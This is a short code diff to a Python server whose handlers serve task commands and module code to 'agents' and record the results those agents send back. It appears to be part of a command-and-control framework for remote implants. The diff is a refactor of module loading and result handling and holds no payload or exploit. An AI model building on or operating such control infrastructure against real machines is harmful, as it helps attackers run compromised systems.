@@ -228,8 +228,7 @@ def handle_task():
     header = task.header
 
     if task.command in commands.MODULE_FILES:
-        with open(f"{commands.MODULE_FOLDER}/{task.command}.py","r") as f:
-            module = f.read()
+        module = commands.module_maker(task.command)
         return http.generate_response(task.id, module, header)
     
     return http.generate_response(task.id, task.command, header)
@@ -242,15 +241,17 @@ def handle_result():
     if not agent_id:
         return http.generate_response(data="None",status=400)
     
-    header, task_id, result = http.parse_request(req)
+    header, task_id, result = http.parse_request(req, True)
     if not task_id and result:
         return http.generate_response(data="None",status=400)
     
-    task = taskmng.get_task_by_id(agent_id, task_id)
+    task = taskmng.get_task_by_id(agent_id, task_id.decode())
     if not task:
         return http.generate_response(data="None",status=400)
 
-    if not taskmng.mark_task_done(agent_id, task_id, result):
+    result = commands.module_handler(agent_id, header, "http", result, task_id)
+
+    if not taskmng.mark_task_done(agent_id, task_id.decode(), header.decode(), result.decode()):
         return http.generate_response(data="None",status=400)
 
     return http.generate_response(data="Done")
